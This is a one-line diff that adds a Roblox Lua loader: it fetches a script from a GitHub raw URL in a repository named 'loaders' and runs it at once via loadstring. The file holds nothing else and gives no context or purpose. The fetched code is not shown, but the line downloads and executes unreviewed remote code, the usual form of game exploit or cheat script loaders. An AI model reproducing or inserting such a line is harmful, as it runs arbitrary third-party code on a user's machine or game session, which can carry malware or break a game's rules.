@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/a-long-flight-sandbox-spam6-3hl18jr1o3jv32.lua"))()
